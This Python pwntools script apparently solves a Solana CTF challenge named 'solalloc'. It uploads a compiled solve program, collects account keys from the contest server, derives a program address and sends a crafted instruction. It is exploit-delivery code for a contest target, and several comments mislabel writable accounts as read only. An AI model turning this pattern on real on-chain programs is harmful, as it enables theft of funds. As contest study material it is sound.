import pwn
from solders.pubkey import Pubkey

account_metas = [
    ("user", "sw"),  # signer + writable
    ("admin", "-w"),  # read only
    ("program", "-w"),  # read only
    ("data", "-w"),  # read only
    ("system program", "-r"),  # read only
]

HOST = "solalloc.chal.ctf.so"
PORT = 1337
p = pwn.remote(HOST, PORT)

with open("build/solve.so", "rb") as f:
    solve = f.read()

p.sendlineafter(b"program pubkey: \n", b"NeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeepLox")
p.sendlineafter(b"program len: \n", str(len(solve)).encode())
p.send(solve)

accounts = {
    "system program": "11111111111111111111111111111111",
}

for l in p.recvuntil(b"num accounts: \n", drop=True).strip().split(b"\n"):
    [name, pubkey] = l.decode().split(": ")
    accounts[name] = pubkey

# bumps are not unique, but the canonical one is used, so its okay
program_id = Pubkey.from_string(accounts["program"])
seed = b"BLAZ"
data_account, bump = Pubkey.find_program_address([seed], program_id)
print(f"Data account: {data_account}")
print(f"Bump: {bump}")
accounts["data"] = str(data_account)
print("accounts:", accounts)

instruction_data = bytes([bump])

p.sendline(str(len(account_metas)).encode())
for name, perms in account_metas:
    p.sendline(f"{perms} {accounts[name]}".encode())

p.sendlineafter(b"ix len: \n", str(len(instruction_data)).encode())
p.send(instruction_data)

p.interactive()
